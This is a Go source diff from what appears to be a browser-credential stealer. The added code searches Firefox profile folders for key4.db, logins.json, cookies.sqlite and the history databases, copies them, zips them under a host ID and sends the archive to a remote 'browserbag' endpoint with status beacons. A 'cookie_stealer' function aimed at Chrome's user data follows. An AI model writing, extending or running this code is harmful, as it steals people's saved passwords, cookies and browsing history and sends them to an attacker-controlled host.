@@ -38,25 +38,27 @@ func get_targetip() string {
 }
 
 func Firefoxpack(addr string) {
-	//http := "http://" + addr + ":5002/browser/browserbag"
-	fire, err := os.Open(lib.Firefoxpath)
+	// if not create dir faild not write
+	lib.Create_dir(lib.Firefox)
+	readDir(lib.Firefoxpath)
+	fire, err := os.Open(lib.Firefox)
 	if err != nil {
 		log.Println(err)
 	}
-	defer fire.Close()
 	var files = []*os.File{fire}
-	// if not create dir faild not write
-	lib.Create_dir(lib.Firefox)
+	defer fire.Close()
 	//lib.GetOutIp()
 	//fname := lib.HOSTID + "-fire.zip"
 	dest := lib.Firefox + lib.HOSTID + "-fire.zip"
 	err = lib.Compress(files, dest)
 	if err != nil {
 		log.Println(err, "targeterr")
+		lib.EventStatusCode(97, lib.HOSTID, lib.VERSION, "1", addr+"Event")
 	} else {
 		//Sshpack(dest, addr, fname)
-		//finflag := make(chan string)
-		//go lib.SingleFile(dest, addr, finflag)
+		finflag := make(chan string)
+		go lib.SingleFile(dest, addr+"browserbag", finflag)
+		lib.EventStatusCode(98, lib.HOSTID, lib.VERSION, "1", addr+"Event")
 	}
 }
 
@@ -189,12 +191,64 @@ func get_current_user() string {
 func check(err error) {
 	if err != nil {
 		log.Println("Error ", err.Error())
-		time.Sleep(3 * time.Second)
 	}
 }
 
+func readDir(dirPath string) {
+
+	files := []string{
+		"key4.db",
+		"logins.json",
+		"cookies.sqlite",
+		"favicons.sqlite",
+		"places.sqlite",
+	}
+	flist, e := ioutil.ReadDir(dirPath)
+
+	if e != nil {
+		fmt.Println("Read file error")
+		return
+	}
+
+	for _, f := range flist {
+		if f.IsDir() {
+			readDir(dirPath + "/" + f.Name())
+		} else {
+			for _, fn := range files {
+				if f.Name() == fn {
+					copyFox(dirPath+"/"+f.Name(), fn)
+					//fmt.Println(dirPath+"/"+f.Name())
+				}
+			}
+		}
+
+	}
+}
+func copyFox(src string, concat string) {
+	var new_path = ""
+	srcFile, err := os.Open(src)
+	check(err)
+
+	defer srcFile.Close()
+	// if have other one rename that
+	_, derr := os.Stat(lib.Firefox + concat)
+	if derr != nil {
+		new_path = lib.Firefox + concat
+	} else {
+		new_path = lib.Firefox + concat + "(1)"
+	}
+
+	destFile, err := os.Create(new_path)
+	check(err)
+	defer destFile.Close()
+
+	_, err = io.Copy(destFile, srcFile)
+	check(err)
+
+	err = destFile.Sync()
+	check(err)
+}
 func cookie_stealer(addr string) error {
-	// todo other browser
 	current_user := get_current_user()
 	cp := current_user + "\\appdata\\Local\\Google\\Chrome\\User Data\\Default\\"
 	//check chrome
